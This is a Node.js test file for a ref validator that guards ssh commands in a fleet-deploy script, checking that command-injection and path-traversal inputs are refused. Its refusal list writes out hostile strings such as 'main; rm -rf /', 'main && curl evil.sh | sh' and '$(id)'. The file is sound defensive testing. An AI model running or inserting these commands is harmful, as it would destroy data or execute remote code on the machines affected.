/**
 * The ref reaches a remote shell, so its SHAPE is the containment.
 *
 * `ssh` joins its arguments into a single string the remote shell interprets, whatever the local caller
 * passes — so unlike `command: argv:` in Ansible, there is no structural escape here and the value has to
 * be constrained instead. Same rule as `isValidCaptureId`: make the dangerous thing inexpressible rather
 * than trying to reject it, on the machine that holds the fleet SSH key of all places.
 */
import { test } from "node:test";
import assert from "node:assert/strict";

import { validRef } from "./deploy-fleet.mjs";

test("commits and ordinary branch names are accepted", () => {
  for (const ref of ["afec73d", "65ead9b1c2d3e4f5", "main", "v8-feature-schema", "origin/main", "v1.2.3"]) {
    assert.equal(validRef(ref), true, ref);
  }
});

test("anything that could reach a shell is refused", () => {
  for (const ref of [
    "main; rm -rf /", "main && curl evil.sh | sh", "$(id)", "`id`", "main | tee /etc/passwd",
    "main\nrm -rf /", "main > /etc/cron.d/x", "a'b", 'a"b', "main&", "",
  ]) {
    assert.equal(validRef(ref), false, JSON.stringify(ref));
  }
});

test("path traversal is refused even though slashes are legal in a ref", () => {
  // `origin/main` must work, so slashes cannot simply be banned — which is exactly what makes `..` its
  // own check rather than something the character class already covers.
  assert.equal(validRef("origin/main"), true);
  assert.equal(validRef("../../etc/passwd"), false);
  assert.equal(validRef("main/../../../root"), false);
});

test("an over-long ref is refused, so the bound is real rather than assumed", () => {
  assert.equal(validRef("a".repeat(64)), true);
  assert.equal(validRef("a".repeat(65)), false);
});
